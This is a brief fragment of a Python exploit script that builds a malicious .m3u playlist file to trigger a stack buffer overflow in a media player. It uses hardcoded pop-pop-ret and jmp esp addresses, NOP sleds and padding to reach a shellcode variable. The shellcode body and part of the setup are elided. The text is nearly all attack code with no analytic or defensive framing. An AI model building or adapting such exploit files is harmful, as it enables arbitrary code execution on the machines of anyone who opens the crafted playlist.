#Using pop pop ret as jump
FILE_NAME = 'exploit-pop-ret.m3u'
...
#01E1B22A is jump to esp
jmpesp = '\x2a\xb2\xe1\x01' 

#pop pop ret address 01B96A10
eip = '\x10\x6a\xb9\x01'
nop = '\x90' * 25
prepend_esp = "XXXX"
...
junk2 = 'C' * (30000 - len(junk1) - len(eip) - len(nop) - len(shellcode) - len(prepend_esp)) 
exploit = junk1 + eip + prepend_esp + '\x90' * 8  + jmpesp + '\x90' * 50 + shellcode + junk2
